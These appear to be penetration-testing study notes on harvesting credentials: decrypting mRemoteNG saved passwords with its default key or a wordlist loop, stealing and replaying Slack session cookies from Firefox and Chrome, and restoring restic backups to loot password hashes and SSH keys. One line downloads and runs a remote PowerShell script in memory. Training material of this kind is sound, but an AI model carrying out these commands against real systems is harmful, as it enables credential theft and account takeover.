# mRemoteNG Credential Extraction (Got to know this was installed on the system by examining the output of the above command in ps)

## Identify

- Software: **mRemoteNG**
    
- Config file: `confCons.xml`
    
- Default location:
    

```text
%USERPROFILE%\AppData\Roaming\mRemoteNG
```

## 1. Find Configuration File

```powershell
ls C:\Users\<user>\AppData\Roaming\mRemoteNG
```

Look for:

```text
confCons.xml
```

## 2. Extract Credentials

`confCons.xml` contains connection details:

- `Username`
    
- `Domain`
    
- `Hostname`
    
- `Protocol`
    
- Encrypted `Password`
    

Example:

```xml
<Node Username="administrator"
      Domain="test.local"
      Password="<encrypted_password>"
      Hostname="10.0.0.10"
      Protocol="RDP" />
```

Copy the `Password` attribute.

## 3. Decrypt Password

### No Custom Master Password

Default master password is:

```text
mR3m
```

Run:
we can use the script [mRemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt) to decrypt the password.
```bash
python3 mremoteng_decrypt.py -s "<encrypted_password>"
```

### Custom Master Password Known

```bash
python3 mremoteng_decrypt.py -s "<encrypted_password>" -p <master_password>
```

If you get:

```text
ValueError: MAC check failed
```

→ Master password is incorrect.

## 4. Crack Master Password

Use a wordlist against the encrypted password:

```bash
for password in $(cat /usr/share/wordlists/fasttrack.txt); do
    echo $password
    python3 mremoteng_decrypt.py -s "<encrypted_password>" -p $password 2>/dev/null
done
```

Successful decryption:

```text
Password: <decrypted_password>
```

## Exam Flow

```text
mRemoteNG installed
      ↓
Find confCons.xml
      ↓
Extract Password attribute
      ↓
Try default mR3m
      ↓
If custom password → crack with wordlist
      ↓
Decrypt → obtain credentials
```

## Abusing Cookies to Get Access to IM Clients
> Instant messaging apps
> There are multiple options to gain access to an IM Client;
> 	use the user's credentials to get the cloud version of the IM application
> 	If the user is using any form of multi-factor authentication, or we can't get the user's plaintext credentials, we can try to steal the user's cookies to log in to the cloud-based client.

- Multiple posts refer to how to abuse `Slack` such as [Abusing Slack for Offensive Operations](https://posts.specterops.io/abusing-slack-for-offensive-operations-2343237b9282) and [Phishing for Slack-tokens](https://thomfre.dev/post/2021/phishing-for-slack-tokens/). We can use them to understand better how Slack tokens and cookies work, but keep in mind that `Slack's` behavior may have changed since the release of those posts.

##### Cookie Extraction from Firefox
- Saves cookies in `SQLite` database file named `cookies.sqlite`.
- Located in each user's APPDATA directory `%APPDATA%\Mozilla\Firefox\Profiles\<RANDOM>.default-release`.
#### Copy Firefox Cookies Database
```python
copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```
- We can copy the file to our machine and use the Python script [cookieextractor.py](https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py) to extract cookies from the Firefox cookies.SQLite database.

#### Extract Slack Cookie from Firefox Cookies Database
use the Python script [cookieextractor.py](https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py) to extract cookies from the Firefox cookies.SQLite database.
```python
python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
```

**After getting the cookie we can use a browser extension [Cookie-Editor](https://cookie-editor.cgagnier.ca/) to add the cookie to our browser**
- Then go to our target website (slack in this case)
- use the extension to add the cookie as the value of `d` cookie, refresh
- voila you are in

## Cookie Extraction from Chromium-based Browsers
> Also stores cookies info in `SQLite` database.
> Only difference is that the cookie value is encrypted with [Data Protection API (DPAPI)](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection).
> Thankfully, a tool [SharpChromium](https://github.com/djhohnstein/SharpChromium) does what we need. It connects to the current user SQLite cookie database, decrypts the cookie value, and presents the result in JSON format.

- Let's use [Invoke-SharpChromium](https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1), a PowerShell script created by [S3cur3Th1sSh1t](https://twitter.com/ShitSecure) which uses reflection to load SharpChromium.'
#### PowerShell Script - Invoke-SharpChromium
```python
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSh arpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1') PS C:\htb> Invoke-SharpChromium -Command "cookies slack.com"
```

- We got an error because the cookie file path that contains the database is hardcoded in [SharpChromium](https://github.com/djhohnstein/SharpChromium/blob/master/ChromiumCredentialManager.cs#L47), and the current version of Chrome uses a different location.

- We can modify the code of `SharpChromium` or copy the cookie file to where SharpChromium is looking.

- `SharpChromium` is looking for a file in `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies`, but the actual file is located in `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies` with the following command we will copy the file to the location SharpChromium is expecting.
#### Copy Cookies to SharpChromium Expected Location
```python
copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
```

We can now use Invoke-SharpChromium again to get a list of cookies in JSON format.

#### Invoke-SharpChromium Cookies Extraction
```python
Invoke-SharpChromium -Command "cookies slack.com"
```
- We can now use this cookie with cookie-editor as we did with Firefox.

# Attacking Backup Servers

## Why Target Backups

- Backup service accounts are frequently configured with **local admin** on target hosts (needed to access all files/services) → compromising the backup system = high-value lateral movement / priv-esc path.
- Backups often contain untouched copies of sensitive files (SAM/SYSTEM hives, `/etc/shadow`, web configs, SSH keys) that may not be accessible live due to file locks/permissions.

## Attack Workflow

1. **Recon** — identify backup software in use on host (process list, installed programs, scheduled tasks, service accounts).
2. **Locate repo** — find where backups are stored (unknown location? search filesystem for a `snapshots` dir — applies on Linux too).
3. **Access repo** — need `RESTIC_PASSWORD` env var or password prompt to interact with repo.
4. **Enumerate snapshots** — list what's been backed up (hosts, paths, timestamps) to pick high-value targets.
5. **Restore & loot** — pull down the snapshot, dig for creds/hashes/keys.

## Restic — Tooling Walkthrough (v0.13.1, example)

Target path: `C:\Windows\System32\restic.exe`

### Step 1 — Init a repo (if setting up test/attack repo)

```powershell
mkdir E:\restic2; restic.exe -r E:\restic2 init
```

### Step 2 — Set password (env var avoids repeated prompts)

```powershell
$env:RESTIC_PASSWORD = 'Password'
```

### Step 3 — Take/simulate a backup

```powershell
restic.exe -r E:\restic2\ backup C:\SampleFolder
```

### Step 3b — Backup locked OS files via VSS (Volume Shadow Copy)

```powershell
restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot
```

- Attacker note: even with VSS, may hit `Access is denied` on some files — the backup entry still gets created but is empty. Don't assume a snapshot = full data.

### Step 4 — Enumerate existing snapshots (recon on what's been backed up)

```powershell
restic.exe -r E:\restic2\ snapshots
```

- Look at `Paths` column for high-value targets: AD servers, DB servers, web app dirs, user profile dirs.

### Step 5 — Restore & extract loot

```powershell
restic.exe -r E:\restic\ restore b2f5caa0 --target C:\Restore
```

- Restored structure: `C:\Restore\<drive letter>\...` (e.g. `C:\Restore\C\SampleFolder`)

## Post-Restore Loot Targets

**Linux backups:**

- `/etc/shadow` → offline crack
- Web app config files → DB creds, API keys
- `.ssh/` → private keys for lateral movement

**Windows backups:**

- SAM & SYSTEM hives → dump local account hashes (secretsdump-style)
- `web.config` / app config files → embedded creds, connection strings

## Operator Notes

- No `RESTIC_PASSWORD` set → you'll need the actual password to restore; check for it in scripts, notes, or other loot first.
- This is a generic pattern — same recon→locate→access→enumerate→restore→loot flow applies to other backup tools (centralized consoles, other repo formats), not just restic.
